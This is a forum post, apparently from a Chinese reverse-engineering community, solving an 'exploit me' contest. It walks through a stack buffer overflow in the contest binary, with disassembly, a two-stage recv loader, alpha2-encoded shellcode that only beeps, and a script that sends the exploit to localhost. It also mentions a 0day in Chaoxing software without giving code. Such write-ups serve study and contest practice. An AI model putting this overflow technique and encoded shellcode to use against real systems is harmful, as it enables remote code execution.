
# [原创]exploit me提要

一开始没打算参赛，晚上无聊搞了搞，发觉还是很简单的。

其实我做的很不好，懒得写文档，但至少可以跨平台的。

## A题

用E语言发了一个大包给本地，直接崩了，从`recv`入手，很容易得到

```
00401000  /$  81EC C8000000 sub     esp, 0C8
00401006  |.  83C9 FF       or      ecx, FFFFFFFF
00401009  |.  33C0          xor     eax, eax
0040100B  |.  8D5424 00     lea     edx, dword ptr [esp]
0040100F  |.  56            push    esi
00401010  |.  57            push    edi
00401011  |.  8BBC24 D40000>mov     edi, dword ptr [esp+D4]
00401018  |.  68 4C904000   push    exploit_.0040904C                ;  ASCII "********************"
0040101D  |.  F2:AE         repne   scasb                            ;  \这里是个strcpyA
0040101F  |.  F7D1          not     ecx
00401021  |.  2BF9          sub     edi, ecx
00401023  |.  8BC1          mov     eax, ecx
00401025  |.  8BF7          mov     esi, edi
00401027  |.  8BFA          mov     edi, edx
00401029  |.  C1E9 02       shr     ecx, 2
0040102C  |.  F3:A5         rep     movsd
0040102E  |.  8BC8          mov     ecx, eax
00401030  |.  83E1 03       and     ecx, 3
00401033  |.  F3:A4         rep     movsb                            ;  /
```

这里面就一个堆栈变量，长度`0xC8` = 200，所以用200字节覆盖，最后用4字节地址来执行。

`ctrl+R`回到调用处，可以看到传进来的参数恰好是`buffer`，

```
0040120B  |.  50            |push    eax                             ; /Flags => 0
0040120C  |.  F3:AB         |rep     stosd                           ; |
0040120E  |.  8D4C24 38     |lea     ecx, dword ptr [esp+38]         ; |
00401212  |.  68 00020000   |push    200                             ; |BufSize = 200 (512.)
00401217  |.  51            |push    ecx                             ; |Buffer
00401218  |.  53            |push    ebx                             ; |Socket
00401219  |.  FF15 D8804000 |call    dword ptr [<&WS2_32.#16>]       ; \recv
0040121F  |.  8BF0          |mov     esi, eax
00401221  |.  85F6          |test    esi, esi
00401223  |.  7D 26         |jge     short exploit_.0040124B
00401225  |.  68 74904000   |push    exploit_.00409074               ;  ASCII "reading stream message erro!"
0040122A  |.  B9 689A4000   |mov     ecx, exploit_.00409A68
0040122F  |.  E8 F3010000   |call    exploit_.00401427
00401234  |.  68 D0124000   |push    exploit_.004012D0
00401239  |.  6A 0A         |push    0A                              ; /Arg1 = 0000000A
0040123B  |.  8BC8          |mov     ecx, eax                        ; |
0040123D  |.  E8 9E000000   |call    exploit_.004012E0               ; \exploit_.004012E0
00401242  |.  8BC8          |mov     ecx, eax
00401244  |.  E8 67000000   |call    exploit_.004012B0
00401249  |.  33F6          |xor     esi, esi
0040124B  |>  8D5424 34     |lea     edx, dword ptr [esp+34]
```

这么明显的溢出，如果还不能跨平台，有点太没意思了。

要跨平台就得在程序内找一个地址，覆盖了返回之后跳到`buffer`中执行，

因此可以直接把返回地址改成一个`retn`指令的地址，就跳到`buffer`了。

不过现在的问题：

1、跨平台选的地址都是004xxxxx，`strcpy`会停止于00

2、就算`strcpy`不停止，`recv`只收200字节，所以后面不好控制

3、由于`strcpy`，`shellcode`前面有00出现会停止造成无法溢出

1、2算做一个问题，就是我们只能编码200字节`shellcode`

看第三个问题，可以用`skyline`的`alpha2`来编码，通过精心选择指令写出的`loader`，

可以只使用`ascii`字符，地址是[6ddK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2V1N6i4m8Q4x3X3g2@1N6h3c8W2L8r3k6@1i4K6u0W2L8X3I4Q4x3V1k6Q4y4@1g2T1K9Y4N6W2N6X3g2J5i4K6u0r3L8h3g2F1N6g2)9J5k6h3S2@1L8h3I4Q4x3X3g2H3K9s2l9`.](https://bbs.kanxue.com/elink@8f5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2V1N6i4m8Q4x3X3g2@1N6h3c8W2L8r3k6@1i4K6u0W2L8X3I4Q4x3V1k6Q4y4@1g2T1K9Y4N6W2N6X3g2J5i4K6u0r3L8h3g2F1N6g2)9J5k6h3S2@1L8h3I4Q4x3X3g2H3K9s2l9`.)

在线版不太会用，下载了`c`代码，发现不是`for win32`的，

试验了几次，发现需要改动头文件，把`srand`的`seed`随便写一个值，不用那个`time`库，再把`strcasecmp`改成`strcmp`就可以用`vc`编译了，编译一个`exe`出来备用

输入方式好像很奇怪，最后发现需要用管道输入，服了，写了一个屁处理来使用

我用我的`XLIB`跨平台使用`API`，不过`alpha2`编码之后怎么也缩不到200字节，

现在得停下来思考，既然一个包200不成，那就再发第2个包，

于是我写了2份`shellcode`，第一个负责溢出，并且去`recv`第2个包，然后执行第2个包

这是第一个

```
   mov edi, esp
   mov ecx, 1024;alloc
   sub edi, ecx

   push 0
   push ecx
   push edi
   push ebx
   mov eax, 4080D8h
   call dword ptr [eax]; 这里是recv
   jmp edi
```

然后是第2个，

```
; fucker
;   initX XFL_ALL
;
;   push 1000
;   push 1000
;   callX Beep
;
```

`XLIB`是我写的一个库，可以用任何可以跨平台的`shellcode`的库代替，这里我就是简单的Bi~~~一下

然后就是那个屁处理了，

```
alpha2 [esp-4] <0.bin >0.txt
alpha2 edi <1.bin >1.txt
```

其实第2个包不需要`alpha2`编码，不过为了保持一致，也就搞一个吧

`0.txt`

```
LLLL7YIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJInkkLlyuP6dS0UPTkzYRJUP3aPW1CnX8XMP3p7pYovpKOM7gpA
```

`1.txt`

```
WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXimQc0uP7pY8L9PZ0XPRol1pSZwDpZCTLK2bKLmUKp2Y38fcWdWrLMQPcLZKvglKSpTLLKPpeLNMnkQPeXM8S0wp7p30qOLSNkaSgLnkplVxt8S3xkfSKyLMfTNkgsPuWPLmNyyQJbdGTrUDtXg0tzwldXsEydLMt4q45L6K2644vuSq7KPMWhSL9NV7Qxtfk0NLXHm8MMKOioioibNNhkO3LKpU4d5SkcVoLwwd3zlKpE7leSYSWs5LNpMYuNPaomV0cCwqv88CU8xh7swpWprHyxgsEPeP3X8p0rByc8JHPkKOKOKOA
```

最后是一个易语言程序负责发包

```
.版本 2
.程序集 窗口程序集1
.子程序 _按钮1_被单击
.局部变量 t, 文本型
c.连接 (“127.0.0.1”, 7777)
t ＝ “LLLL7YIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJInkkLlyuP6dS0UPTkzYRJUP3aPW1CnX8XMP3p7pYovpKOM7gpA”
t ＝ t ＋ 取空白文本 (200 － 取文本长度 (t))
c.发送数据 (到字节集 (t) ＋ 到字节集 (4199334))
延时 (100)
c.发送数据 (“WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXimQc0uP7pY8L9PZ0XPRol1pSZwDpZCTLK2bKLmUKp2Y38fcWdWrLMQPcLZKvglKSpTLLKPpeLNMnkQPeXM8S0wp7p30qOLSNkaSgLnkplVxt8S3xkfSKyLMfTNkgsPuWPLmNyyQJbdGTrUDtXg0tzwldXsEydLMt4q45L6K2644vuSq7KPMWhSL9NV7Qxtfk0NLXHm8MMKOioioibNNhkO3LKpU4d5SkcVoLwwd3zlKpE7leSYSWs5LNpMYuNPaomV0cCwqv88CU8xh7swpWprHyxgsEPeP3X8p0rByc8JHPkKOKOKOA”)
c.断开连接 ()
```

## B题

这个。。。很毒很真实。

按照那个`doc`教程获得`CLSID`，再`baidu`一下啊，发现是超星的0day

只要自己写`shellcode`，用`utf16`编码就可以了

不小心下载`alpha2`的时候看到`skyline`的网站上有个`beta.c`

发现就是用来干这个的，于是。。。提交。【揭露一下，第2个没耐心了，根本没测试，估计不行，哈哈】

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
